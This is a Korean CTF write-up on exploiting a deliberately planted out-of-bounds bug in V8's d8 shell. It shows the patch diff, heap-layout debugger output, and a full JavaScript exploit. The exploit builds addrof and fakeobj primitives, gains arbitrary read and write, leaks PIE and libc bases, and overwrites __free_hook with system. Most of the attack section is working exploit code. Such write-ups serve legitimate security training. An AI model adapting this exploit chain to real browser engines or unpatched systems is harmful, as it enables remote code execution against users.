```diff
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}
 
 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

+BUILTIN(ArrayOob) 부분을 보면 되는데, 인자가 없을 때는 read를 해주고 인자를 1개 전달하면 write를 한다.

취약점은 element.get_scalar(length); 로 length를 그대로 전달하는 부분인데, 보통 길이는 1부터 시작하기 때문에

배열에 접근하기 위해선 length - 1의 index를 전달한다. 하지만 여기선 length를 전달하므로 oob가 발생한다.

그럼 이 oob를 활용하면서 익스플로잇을 해야하는데, 이는 v8에서 데이터가 저장되는 구조를 보면서 생각해보자.

```c
d8> a = [1.1, 2.2];
[1.1, 2.2]
d8> %DebugPrint(a);
DebugPrint: 0x1c4ffca90151: [JSArray]
 - map: 0x39f60db82ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2c751aad1111 <JSArray[0]>
 - elements: 0x1c4ffca90131 <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x3bf84fcc0c71 <FixedArray[0]> {
    #length: 0x0f0f42c801a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x1c4ffca90131 <FixedDoubleArray[2]> {
           0: 1.1
           1: 2.2
 }
0x39f60db82ed9: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x39f60db82e89 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x0f0f42c80609 <Cell value= 1>
 - instance descriptors #1: 0x2c751aad1f49 <DescriptorArray[1]>
 - layout descriptor: (nil)
 - transitions #1: 0x2c751aad1eb9 <TransitionArray[4]>Transition array #1:
     0x3bf84fcc4ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x39f60db82f29 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x2c751aad1111 <JSArray[0]>
 - constructor: 0x2c751aad0ec1 <JSFunction Array (sfi = 0xf0f42c8aca1)>
 - dependent code: 0x3bf84fcc02c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[1.1, 2.2]
```

DebugPrint를 통해 a의 map주소랑 a의 JSArray 주소를 알고 가자. 여기서 우리가 넣은 값이 들어있는 elements를 살펴보면

```bash
gef➤  x/40gx 0x1c4ffca90131 - 1
0x1c4ffca90130:	0x00003bf84fcc14f9	0x0000000200000000
0x1c4ffca90140:	0x3ff199999999999a	0x400199999999999a
0x1c4ffca90150:	0x000039f60db82ed9	0x00003bf84fcc0c71
0x1c4ffca90160:	0x00001c4ffca90131	0x0000000200000000
```

-1을 해준 이유는 포인터 태그 메커니즘에서 Pointers는 주소에 &1을 하기 때문에 -1을 하면 제대로 볼 수 있다.

여기서 0x3ff199...., 0x400199... 들이 1.1, 2.2인데 바로 뒤에 주소를 보면 map 이라는 걸 알 수 있다.

그러면 oob를 통해서 map에 write 혹은 read가 가능하다는 것이다. 그럼 object의 주소를 알아보도록 하자.

다음과 같은 코드를 보자. 

```javascript
var obj = {"A":1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj) {
    obj_arr[0] = in_obj;
    obj_arr.oob(float_arr_map);
    let addr = obj_arr[0];
    obj_arr.oob(obj_arr_map);

    return ftoi(addr);
}
```



object array의 map을 float array map으로 변경하고, 0번째 요소를 리턴하는 함수이다. 만약 A라는 object array가 있을 때 addrof(A)를 하게 되면 원래라면 A의 주소를 참조해서 해당 값을 출력해야 하는데, float array map으로 변경하면 A object의 주소가 출력된다.  그다음 fake object를 만드는 코드를 보자.

```javascript
var obj = {"A":1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

function fakeobj(addr) {
    float_arr[0] = itof(addr);
    float_arr.oob(obj_arr_map);
    let fake = float_arr[0];
    float_arr.oob(float_arr_map);

    return fake;
}
```

float array map을 object array map으로 변경하고 해당 float array를 리턴하는 코드이다. 이걸 이용하면 aar을 할 수 있다.

```javascript
var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function aar(addr) {
    if (addr % 2n == 0)
   	    addr += 1n;

    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    return ftoi(fake[0]);
}
```

4개의 요소를 가지는 배열을 만들고 첫 번쨰 요소에는 float array map을 넣는다. 그리고 aar 의 인자로 읽고 싶은 주소를 넘기고, addrof(arb_rw_arr) - 0x20의 주소를 fake object로 만든다. 왜 - 0x20이냐하면 4개의 요소가 있기 때문에 0x20 만큼 빼주어야 fake obj가 위치하는 주소가 된다. 그리고 3번째에 addr - 0x10을 해주는데, 왜 냐면 여기가 elements 부분인데 elements가 가리키는 주소는 map이고 해당 주소에 0x10을 더해야 값이 나오기 때문이다. 그러면 즉 addr - 0x10 + 0x10에 접근하게 되고 addr의 주소가 가진 값을 얻을 수 있다.

```javascript
function aaw_init(addr, val) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    fake[0] = itof(BigInt(val));
}
```

aaw 인데, aar 함수랑 큰 차이는 없다. 그런데 저 addr을 ArrayBuffer로 생성한 buf의 주소를 넣어주고 그 주소로부터 0x20 위치에 val 주소를 쓰게 되면 dataview를 통해서 해당 영역에 접근할 수 있다.

그 뒤론 그냥 리눅스 익스플로잇이랑 똑같은데, 보호기법이 다 걸려있어서 __free_hook을 system으로 덮으면 된다. 혹은 wasm을 이용해 rwx를 만들어서 쉘코드를 실행시키는 방법이 있다.

```javascript
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var obj = {"A": 1};
var obj_arr = [obj];
var float_arr = [1.1, 2.2, 3.3, 4.4];
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj) {
    obj_arr[0] = in_obj;
    obj_arr.oob(float_arr_map);
    let addr = obj_arr[0];
    obj_arr.oob(obj_arr_map);

    return ftoi(addr);
}

function fakeobj(addr) {
    float_arr[0] = itof(addr);
    float_arr.oob(obj_arr_map);
    let fake = float_arr[0];
    float_arr.oob(float_arr_map);

    return fake;
}

var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function aar(addr) {
    if(addr % 2n == 0)
        addr += 1n;

    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    return ftoi(fake[0]);
}

function aaw_init(addr, val) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    fake[0] = itof(BigInt(val));
}


function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    aaw_init(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}

var test = new Array([1.1, 2.2, 3.3, 4.4]);

var test_addr = addrof(test);
var map_ptr = aar(test_addr - 1n);
console.log("[+] map_ptr: 0x" + map_ptr.toString(16));
var map_sec_base = map_ptr - 0x2f79n;
var heap_ptr = aar(map_sec_base + 0x18n);
var PIE_leak = aar(heap_ptr);
var PIE_base = PIE_leak - 0xd87ea8n;
console.log("[+] PIE_leak: 0x" + PIE_leak.toString(16));
console.log("[+] PIE_base: 0x" + PIE_base.toString(16));
var puts_got = PIE_base + 0xd9a3b8n;
var libc_base = aar(puts_got) - 0x6f6a0n;
var __free_hook = libc_base + 0x3c67a8n;
var system = libc_base + 0x453a0n;
console.log("[+] puts_got: 0x" + puts_got.toString(16));
console.log("[+] libc_base: 0x" + libc_base.toString(16));
console.log("[+] __free_hook: 0x" + __free_hook.toString(16));
console.log("[+] system: 0x" + system.toString(16));

arb_write(__free_hook, system);

console.log("xcalc")
```



